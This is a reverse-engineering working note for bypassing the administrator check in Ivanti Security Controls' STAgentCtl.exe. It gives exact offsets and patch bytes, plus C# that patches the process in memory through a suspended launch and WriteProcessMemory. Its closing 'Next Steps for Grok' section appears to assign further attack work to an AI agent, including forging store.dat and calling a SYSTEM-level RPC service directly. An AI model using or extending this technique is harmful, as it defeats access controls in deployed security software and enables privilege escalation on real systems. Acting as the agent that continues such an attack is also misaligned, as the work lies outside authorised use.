# Golden Key: STAgentCtl.exe Admin Bypass

## Binary Info
- **File**: Ivanti Security Controls STAgentCtl.exe v9.4.34497.0
- **Size**: 304,760 bytes
- **Arch**: x64 PE
- **SHA256** (original): `./STAgentCtl.exe` in repo

## The Real Admin Check

Found at **RVA 0x1D60C** (file offset `0x1CA0C`):

```
0x1D60A (0x1CA0A): mov cl, 1                        ; arg = true
0x1D60C (0x1CA0C): call qword ptr [rip + 0x12046]   ; IsUserAdministrator (STCore.dll IAT)
0x1D612 (0x1CA12): test al, al                        ; check return
0x1D614 (0x1CA14): je 0x1DD20                        ; jump to "requires admin" error
```

**The check is in the dispatcher** (`0x1D2A0`), not in individual command handlers. The dispatcher calls `IsUserAdministrator(true)` from **STCore.dll** via IAT, then jumps to admin error if not admin.

## Why `help` worked, `status` didn't

The dispatcher has two code paths:
1. **Early-exit path** (`0x1D5F4`): Commands with selector 8 (`help`) skip the admin check entirely
2. **Normal path** (`0x1D60A`): All other commands flow through `IsUserAdministrator` → blocked

## The Patch (2 patches, applied in-memory)

### Patch 1 — REAL admin bypass (RVA `0x1D614`, file `0x1CA14`)
NOP the `je` conditional jump (6 bytes):
```
Original: 0F 84 06 07 00 00    →    90 90 90 90 90 90
```

### Patch 2 — Handler early return (RVA `0x1DCF4`, file `0x1D0F4`)
Make the handler function return success immediately (7 bytes):
```
Original: 33 C9 E8 25 E8 FE FF 4C 8B C0
Patched:  B8 01 00 00 00 C3 90
```

This is belt-and-suspenders for COM init edge cases.

## Full Technique

```csharp
// 1. Create process suspended
CreateProcess(exe, args, ..., CREATE_SUSPENDED, out pi);

// 2. Read PEB for ImageBaseAddress
// Use 48-byte buffer for NtQueryInformationProcess (NOT 24 — x64)
byte[] pbi = new byte[48];
NtQueryInformationProcess(pi.hProcess, 0, pbi, 48, out retLen);
IntPtr pebAddr = (IntPtr)BitConverter.ToInt64(pbi, 8);

byte[] peb = new byte[32];
ReadProcessMemory(pi.hProcess, pebAddr, peb, 32, out read);
long imgBase = BitConverter.ToInt64(peb, 0x10);

// 3. Apply patches
// Patch 1: NOP je at admin check
WriteProcessMemory(hProcess, imgBase + 0x1D614, 
    new byte[] {0x90,0x90,0x90,0x90,0x90,0x90}, 6, out _);
// Patch 2: early return from handler
WriteProcessMemory(hProcess, imgBase + 0x1DCF4, 
    new byte[] {0xB8,0x01,0x00,0x00,0x00,0xC3,0x90}, 7, out _);

// 4. Resume
ResumeThread(pi.hThread);
WaitForSingleObject(pi.hProcess, timeout);
```

## Current Blocker: Output Capture

STAgentCtl.exe uses `WriteConsole` (not stdout), so pipe redirection doesn't work. Need either:
- `CreateFile` with inheritable console handles
- Actual console window (via SCHTASKS)
- Kernel32 console API hooks

## Next Steps for Grok

1. We have the admin bypass working (status returns exit 0 vs -1), but output is empty because STAgentCtl writes to console, not stdout
2. Need a reliable way to capture output from a console-mode app that uses WriteConsole
3. Even with admin bypass, `dispatch`/`status` may still fail if STDispatch rejects calls from an unregistered agent (store.dat = 0 bytes)
4. If the above doesn't work, next attack vector: forge store.dat, or make direct RPC calls to STDispatch (PID 4188, SYSTEM) via NdrClientCall3
